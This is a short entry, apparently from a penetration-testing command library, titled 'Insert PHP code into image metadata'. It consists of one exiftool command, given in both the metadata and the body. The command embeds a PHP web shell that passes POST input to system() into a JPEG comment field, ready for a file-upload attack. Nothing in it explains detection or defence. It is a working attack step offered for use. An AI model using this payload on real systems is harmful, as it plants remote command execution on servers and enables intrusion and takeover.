---
id: 21bae7ef-4596-4ea0-9009-888894e81e6b
name: Insert PHP code into image metadata
type: command
executor: bash
data: exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);}
  __halt_compiler();" img.jpg
output: null
created_at: '2023-04-06T03:56:41.078622+00:00'
updated_at: '2023-04-10T20:24:34.601053+00:00'
---

# Insert PHP code into image metadata

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```
